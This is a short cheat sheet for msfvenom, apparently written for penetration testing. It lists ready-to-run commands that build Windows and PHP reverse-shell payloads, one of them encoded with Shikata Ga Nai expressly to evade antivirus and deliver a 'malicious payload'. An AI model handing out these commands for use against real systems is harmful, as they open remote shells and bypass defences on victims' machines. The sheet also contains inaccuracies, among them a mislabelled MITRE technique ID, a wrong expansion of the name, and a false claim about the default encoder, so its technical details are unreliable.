## MSFVenom

Github Repo: https://github.com/rapid7/metasploit-framework/tree/master

Guides and HowTo: https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-msfvenom.html

Metasploit in Linux: https://www.kali.org/tools/metasploit-framework/

#### **Installation**
```bash
sudo apt install metasploit-framework
```

**Note**: MSFVenom stands for Metasploit Framework and is a combination of MSFPayload and MSFencode. 

#### Covered Techniques (MITRE ATT&CK)
- T1023: Exploitation & Client Execution
- T1068: Exploitation for Privilege Escalation

### 1. Generate a Reverse TCP Shell Payload

```bash 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```
- Purpose: Create a reverse TCP shell payload for a Windows System.
-Use Case: Ideal for gaining remote access to a target machine via a reverse shell connection. 

More on reverse shells with Venom: https://security.packt.com/reverse-shells-from-payloads/

### 2. Encode Payload with Shikata Ga Nai

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
```
- Purpose: Encodes the payload with the Shikata Ga Nai encoder to evade detection by antivirus systems and filtering out bad characters.
- Use Case: Useful for bypassing basic security measure when delivering malicious payload.

### 3. Generate a Web Delivery Payload

```bash 
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.php
```
- Purpose: Creates a PHP reverse shell payload for web delivery.
- Use Case: Ideal for targeting web servers with vulnerable upload functionality.

### 4. Add Custom Bad Characters to a Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a\x0d" -f exe -o payload.exe
```

- Purpose: Generates a paylod while avoiding specified bad characters that may interfere with execution.
- Use Case: Helpful when working with exploits that require custom encoding to bypass filters.

#### **Notes**
1. -a option can also be added to specify the architecture. If not, venom will attempt to select one based on the payload.
2. Some with -p, it can specify the platform but if not, venom will also attempt to select it based on the payload.
3. Shikata Ga Nai is the default encoder.
4. When the -b option is specified for bad characters, Venom will attempt to find and select the encoder that removes those bad characters.